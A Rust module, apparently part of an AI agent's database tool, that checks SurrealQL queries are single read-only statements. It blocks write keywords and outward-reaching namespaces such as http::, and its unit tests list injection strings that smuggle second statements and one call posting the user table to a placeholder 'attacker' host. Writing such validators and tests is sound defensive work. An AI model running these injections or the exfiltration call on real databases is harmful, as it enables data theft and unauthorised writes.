//! Conservative check that an ad-hoc SurrealQL query is one statement that reads and never writes.

/// Statements a read-only query may be.
const READ_STATEMENTS: [&str; 3] = ["SELECT", "INFO", "RETURN"];

/// Keywords and method names that write, change schema, hold state or have side effects.
const FORBIDDEN_KEYWORDS: [&str; 28] = [
    "CREATE", "UPDATE", "UPSERT", "DELETE", "INSERT", "RELATE", "DEFINE", "REMOVE", "ALTER", "REBUILD", "KILL",
    "LIVE", "BEGIN", "COMMIT", "CANCEL", "USE", "LET", "SLEEP", "THROW", "OPTION", "ACCESS", "FUNCTION", "PUT",
    "PUT_IF_NOT_EXISTS", "COPY", "COPY_IF_NOT_EXISTS", "RENAME", "RENAME_IF_NOT_EXISTS",
];

/// Function namespaces that reach outside the database, touch stored files, advance sequences or run stored code.
const FORBIDDEN_NAMESPACES: [&str; 5] = ["HTTP", "FN", "API", "FILE", "SEQUENCE"];

/// Characters that end a SurrealQL line comment.
const LINE_ENDS: [char; 5] = ['\n', '\r', '\u{2028}', '\u{2029}', '\u{85}'];

/// Why the lexer gave up on a query.
#[derive(Debug, PartialEq, Eq)]
enum Unreadable {
    Unclosed,
    FileLiteral,
    EscapedIdentifier,
}

impl Unreadable {
    fn message(&self) -> String {
        let why = match self {
            Self::Unclosed => "a string, quoted identifier or comment is not closed.",
            Self::FileLiteral => "file literals (f\"bucket:/path\") are not allowed.",
            Self::EscapedIdentifier => "backslash escapes inside `quoted` or \u{27e8}quoted\u{27e9} identifiers are not allowed.",
        };
        format!("query_surrealdb refused the query: {why}")
    }
}

/// `Ok` when `query` is a single SELECT, INFO or RETURN with no write, DDL or side-effect token.
pub fn check_read_only(query: &str) -> Result<(), String> {
    for escapes in [true, false] {
        let code = code_outside_literals(query, escapes).map_err(|e| e.message())?;
        check_code(&code)?;
    }
    Ok(())
}

fn is_word(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_'
}

/// True when `out` ends in a lone `f` or `F`, the prefix of a file literal.
fn ends_in_file_prefix(out: &str) -> bool {
    let mut tail = out.chars().rev();
    matches!(tail.next(), Some('f' | 'F')) && !tail.next().is_some_and(is_word)
}

/// `query` with each string and comment replaced by a space and each quoted identifier by its words.
fn code_outside_literals(query: &str, escapes: bool) -> Result<String, Unreadable> {
    let mut out = String::with_capacity(query.len());
    let mut chars = query.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\'' | '"' => {
                if ends_in_file_prefix(&out) {
                    return Err(Unreadable::FileLiteral);
                }
                loop {
                    match chars.next().ok_or(Unreadable::Unclosed)? {
                        '\\' if escapes => {
                            chars.next().ok_or(Unreadable::Unclosed)?;
                        }
                        ch if ch == c => break,
                        _ => {}
                    }
                }
                out.push(' ');
                continue;
            }
            '`' | '\u{27e8}' => {
                let close = if c == '`' { '`' } else { '\u{27e9}' };
                out.push(' ');
                loop {
                    match chars.next().ok_or(Unreadable::Unclosed)? {
                        '\\' => return Err(Unreadable::EscapedIdentifier),
                        ch if ch == close => break,
                        ch => out.push(if is_word(ch) { ch } else { ' ' }),
                    }
                }
                out.push(' ');
                continue;
            }
            _ => {}
        }
        let next = chars.peek().copied();
        if c == '#' || (c == '-' && next == Some('-')) || (c == '/' && next == Some('/')) {
            while chars.next_if(|ch| !LINE_ENDS.contains(ch)).is_some() {}
            out.push(' ');
            continue;
        }
        if c == '/' && next == Some('*') {
            chars.next();
            let mut prev = ' ';
            loop {
                let ch = chars.next().ok_or(Unreadable::Unclosed)?;
                if prev == '*' && ch == '/' {
                    break;
                }
                prev = ch;
            }
            out.push(' ');
            continue;
        }
        out.push(c);
    }
    Ok(out)
}

/// Checks code with its literals and comments already blanked.
fn check_code(code: &str) -> Result<(), String> {
    let refuse = |why: String| Err(format!("query_surrealdb is read-only and refused the query: {why}"));
    if code.contains('/') {
        return refuse(
            "`/` is not allowed (it can open a regex literal); compute ratios after reading, and match \
             patterns with string::matches(field, <regex> \"...\")."
                .into(),
        );
    }
    match code.split(';').filter(|s| !s.trim().is_empty()).count() {
        0 => return refuse("the query is empty.".into()),
        1 => {}
        _ => return refuse("send exactly one statement.".into()),
    }
    let words = words(code);
    let first = words.first().map(|w| w.text.to_ascii_uppercase()).unwrap_or_default();
    let leads = code.trim_start().get(..first.len()).is_some_and(|head| head.eq_ignore_ascii_case(&first));
    if !leads || !READ_STATEMENTS.contains(&first.as_str()) {
        return refuse("it must be a single SELECT, INFO or RETURN statement.".into());
    }
    for word in &words {
        if word.param {
            if word.called {
                return refuse(format!("calling the parameter `${}` is not allowed.", word.text));
            }
            continue;
        }
        let upper = word.text.to_ascii_uppercase();
        if FORBIDDEN_KEYWORDS.contains(&upper.as_str()) {
            return refuse(format!("`{upper}` can write or has side effects; use surrealql_execute for writes."));
        }
        if word.path && FORBIDDEN_NAMESPACES.contains(&upper.as_str()) {
            return refuse(format!("{}:: functions are not allowed.", word.text.to_ascii_lowercase()));
        }
    }
    Ok(())
}

/// One identifier-like word in blanked code.
struct Word<'a> {
    text: &'a str,
    /// Preceded by `$`.
    param: bool,
    /// Followed by `::`.
    path: bool,
    /// Followed by `(`.
    called: bool,
}

/// Identifier-like words of `code`, skipping ones that start with a digit.
fn words(code: &str) -> Vec<Word<'_>> {
    let bytes = code.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < code.len() {
        let c = bytes[i] as char;
        if !c.is_ascii() || !is_word(c) {
            i += code[i..].chars().next().map_or(1, char::len_utf8);
            continue;
        }
        let start = i;
        while i < code.len() && is_word(bytes[i] as char) {
            i += 1;
        }
        if c.is_ascii_digit() {
            continue;
        }
        let param = code[..start].ends_with('$');
        let rest = code[i..].trim_start();
        out.push(Word { text: &code[start..i], param, path: rest.starts_with("::"), called: rest.starts_with('(') });
    }
    out
}

#[cfg(test)]
mod tests {
    use super::check_read_only;

    fn allowed(q: &str) {
        assert_eq!(check_read_only(q), Ok(()), "{q}");
    }

    fn refused(q: &str) {
        assert!(check_read_only(q).is_err(), "should refuse: {q}");
    }

    #[test]
    fn common_reads_pass() {
        allowed("SELECT * FROM agent_thread WHERE status = 'idle' LIMIT 5");
        allowed("select count() from task group all");
        allowed("RETURN count(SELECT * FROM user)");
        allowed("INFO FOR TABLE agent_approval");
        allowed("SELECT id, `status` FROM agent_approval ORDER BY id");
        allowed("SELECT math::sum(v) AS total FROM x GROUP ALL");
        allowed("SELECT * FROM stress_test_run WHERE started_at > time::now() - 1d ORDER BY started_at DESC LIMIT 10");
        allowed("SELECT * FROM agent_approval WHERE thread = agent_thread:\u{27e8}a-b\u{27e9}");
        allowed("SELECT * FROM stress_test_run:`f2e2b3db-02b5-4ee4-83d4-0913cdee7f21`");
        allowed("SELECT 1;");
        allowed("  SELECT $update, $delete FROM x  ");
        allowed("SELECT * FROM x WHERE note = \"it's done\"");
        allowed("SELECT * FROM x WHERE path = 'C:\\\\Windows\\\\'");
        allowed("SELECT * FROM x WHERE owner = r'user:abc' AND at > d'2026-09-01T00:00:00Z'");
        allowed("SELECT string::len(name) AS n FROM x WHERE $auth.id != NONE");
        allowed("SELECT * FROM x WHERE elf = 'a'");
    }

    #[test]
    fn keywords_inside_strings_and_comments_do_not_count() {
        allowed("SELECT * FROM x WHERE note = 'please update; delete later'");
        allowed("SELECT * FROM x -- UPDATE is only mentioned here");
        allowed("SELECT * FROM x /* ; DELETE */ WHERE a = 1");
        allowed("SELECT 1 # ; REMOVE TABLE x\n");
    }

    #[test]
    fn a_second_statement_is_refused() {
        refused("SELECT 1; UPDATE agent_approval SET status = 'accepted'");
        refused("select 1; update x set y = 1");
        refused("INFO FOR DB; REMOVE TABLE x");
        refused("SELECT * FROM x WHERE a = `b`; SELECT 2");
        refused("BEGIN; SELECT 1; COMMIT");
    }

    #[test]
    fn a_nested_write_is_refused() {
        refused("RETURN (UPDATE agent_approval SET status = 'accepted', decided_by = assignee)");
        refused("SELECT * FROM (DELETE agent_turn)");
        refused("SeLeCt * FROM (dElEtE x)");
        refused("RETURN { CREATE x CONTENT { a: 1 } }");
        refused("SELECT * FROM x WHERE (INSERT INTO y { a: 1 }) != NONE");
        refused("RETURN (RELATE a:1->likes->b:2)");
        refused("RETURN (UPSERT x:1 SET a = 1)");
    }

    #[test]
    fn comments_cannot_hide_a_statement() {
        refused("SELECT 1 /* ; */ ; UPDATE x SET y = 1");
        refused("SELECT 1 -- note\n; UPDATE x SET y = 1");
        refused("SELECT 1 -- note\r; UPDATE x SET y = 1");
        refused("SELECT 1 -- note\u{2028}; UPDATE x SET y = 1");
        refused("SELECT 1 # note\u{85}; DELETE x");
        refused("SELECT 1 -- '\n; UPDATE x SET y = 1; SELECT 1 -- '");
    }

    #[test]
    fn quotes_cannot_hide_a_statement() {
        refused("SELECT 'a\\'; UPDATE x SET y = 1; --'");
        refused("SELECT * FROM t WHERE a = /'/; UPDATE x SET y = 1; RETURN /'/");
        refused("SELECT * FROM t WHERE a = /x\\// ; UPDATE y SET z = 1");
        refused("SELECT 'unterminated");
        refused("SELECT 1 /* unterminated");
        refused("SELECT `unterminated FROM x");
    }

    #[test]
    fn side_effects_and_other_statements_are_refused() {
        refused("RETURN http::get('https://example.com')");
        refused("RETURN HTTP :: post('https://example.com', {})");
        refused("RETURN fn::purge()");
        refused("RETURN api::invoke('/x')");
        refused("SELECT sleep(1s) FROM x");
        refused("RETURN function() { return 1; }");
        refused("RETURN sequence::nextval('s')");
        refused("LET $x = 1");
        refused("LIVE SELECT * FROM x");
        refused("KILL u'0189d3f8-0000-0000-0000-000000000000'");
        refused("USE NS a DB b");
        refused("THROW 'x'");
        refused("OPTION IMPORT");
        refused("CREATE x");
        refused("DEFINE TABLE x");
        refused("SHOW CHANGES FOR TABLE x SINCE 1");
        refused("(SELECT 1)");
        refused("");
        refused("  ;  ");
    }

    #[test]
    fn quoted_namespaces_and_keywords_are_seen() {
        refused("RETURN `http`::get('x')");
        refused("RETURN \u{27e8}http\u{27e9}::get('x')");
        refused("SELECT * FROM `http`::head('x')");
        refused("RETURN `http`::`post`('https://attacker', (SELECT * FROM user))");
        refused("RETURN `api`::invoke('x')");
        refused("RETURN `sleep`(1s)");
        refused("RETURN `sequence`::nextval('s')");
        refused("SELECT * FROM x WHERE id = `update`");
    }

    #[test]
    fn escapes_inside_quoted_identifiers_are_refused() {
        refused("RETURN `\\u{68}ttp`::get('x')");
        refused("RETURN \u{27e8}ht\\u{74}p\u{27e9}::get('x')");
        refused("SELECT * FROM `a\\`b`");
    }

    #[test]
    fn stored_files_are_out_of_reach() {
        refused("RETURN f\"b:/k\".put('x')");
        refused("RETURN F'b:/k'.get()");
        refused("RETURN file::copy(f\"b:/a\", \"c\")");
        refused("RETURN file::put(x, 'y')");
        refused("SELECT avatar.put('x') FROM user");
        refused("SELECT avatar.copy('b:/c'), avatar.rename_if_not_exists('d') FROM user");
        refused("SELECT avatar.put_if_not_exists('x') FROM user");
        refused("RETURN `file`::exists(x)");
    }

    #[test]
    fn a_parameter_cannot_be_called() {
        refused("RETURN $purge()");
        refused("SELECT $hook (1) FROM x");
        allowed("SELECT $auth.id, $value FROM x");
    }
}
